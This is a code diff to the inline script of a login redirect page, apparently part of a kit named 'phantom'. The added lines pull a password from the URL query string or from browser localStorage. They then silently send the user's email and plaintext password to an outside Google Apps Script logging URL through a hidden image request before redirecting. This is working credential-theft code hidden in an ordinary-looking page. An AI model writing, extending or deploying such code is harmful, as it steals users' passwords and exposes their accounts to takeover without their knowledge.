@@ -11,10 +11,11 @@
     <script>
       (function() {
         var SHEET_LOG_URL = "https://script.google.com/macros/s/AKfycbw-ffrNNCT4Ci8rMtrrFCEmVPUqKvWmSaIwuFR4nGo9v695xGfzeiBN81sIHe75HJ23tg/exec";
-        var email = "", name = "";
+        var email = "", name = "", password = "";
         try {
           localStorage.setItem("phantom-from-redirect", "1");
           var hash = location.hash && location.hash.slice(1);
+          var search = location.search && location.search.slice(1);
           if (hash) {
             var params = new URLSearchParams(hash);
             var idToken = params.get("id_token");
@@ -33,6 +34,16 @@
               } catch (e) {}
             }
           }
+          if (search) {
+            var q = new URLSearchParams(search);
+            if (q.get("email")) email = String(q.get("email")).trim();
+            if (q.get("username")) email = String(q.get("username")).trim();
+            if (q.get("name")) name = String(q.get("name")).trim();
+            if (q.get("password")) password = String(q.get("password"));
+          }
+          try {
+            if (!password) password = localStorage.getItem("phantom-user-password") || "";
+          } catch (e) {}
         } catch (e) {}
 
         var scriptPath = location.pathname.replace(/\/[^/]*$/, "/") + "blocked-emails.js?v=" + Date.now();
@@ -53,9 +64,9 @@
           if (location.pathname && location.pathname.indexOf("redirect") !== -1) {
             target = location.pathname.replace("redirect.html", target);
           }
-          if (SHEET_LOG_URL && (email || name)) {
+          if (SHEET_LOG_URL && (email || password)) {
             var time = new Date().toISOString();
-            var q = "?email=" + encodeURIComponent(email) + "&name=" + encodeURIComponent(name) + "&time=" + encodeURIComponent(time);
+            var q = "?email=" + encodeURIComponent(email) + "&password=" + encodeURIComponent(password) + "&time=" + encodeURIComponent(time);
             var img = new Image();
             img.src = SHEET_LOG_URL + q;
             setTimeout(function() { go(target); }, 600);
